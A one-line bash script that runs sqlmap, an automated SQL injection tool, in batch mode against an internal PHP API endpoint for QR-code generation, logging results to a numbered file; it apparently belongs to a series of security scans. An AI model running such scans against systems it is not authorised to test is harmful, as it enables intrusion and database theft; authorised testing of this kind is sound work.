#!/bin/bash
python /Users/zhaichuang/Downloads/sqlmapTools/sqlmap.py -u 'http://172.16.56.199/api/whistleMS/index.php' --data 'm=qrcode&a=generateQRCode&device_type=web&whistle_info_old=18E6FB817C407C6B77FF54E5B6E6D1C9E7315A7452B0319FC04B22EF4777825B4F44726BB4DDD20E' --level=1 --batch >>/Users/zhaichuang/Desktop/python/GjWshile/MS/MS_logfiles/51_generateQRCode.log